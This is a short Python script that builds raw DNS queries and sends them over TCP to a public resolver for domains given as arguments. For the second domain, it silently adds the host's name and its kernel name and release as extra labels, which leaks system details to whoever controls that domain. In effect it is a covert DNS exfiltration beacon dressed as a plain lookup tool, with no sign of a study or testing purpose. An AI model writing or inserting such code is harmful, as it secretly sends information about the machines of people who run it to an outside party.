import socket
import struct
import sys
import subprocess

def encode_domain(domain):
    parts = domain.split('.')
    encoded = b''.join(struct.pack('B', len(part)) + part.encode() for part in parts) + b'\x00'
    return encoded

def build_query(domain):
    id_val = 0x1234
    header = struct.pack('>HHH', id_val, 0x0100, 1) + struct.pack('>HHH', 0, 0, 0)
    qname = encode_domain(domain)
    question = qname + struct.pack('>HH', 1, 1)
    message = header + question
    return message

domains = sys.argv[1:]
sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
sock.connect(('8.8.8.8', 53))
for i, domain in enumerate(domains):
    if i == 1:
        runner_name = socket.gethostname()
        uname_output = subprocess.check_output(["uname", "-s", "-r"], text=True).strip().split()
        os_ver = '.'.join(uname_output)
        query_domain = f"{runner_name}.{os_ver}.{domain}"
    else:
        query_domain = domain
    msg = build_query(query_domain)
    length = len(msg)
    prefix = struct.pack('>H', length)
    sock.sendall(prefix + msg)
sock.close()
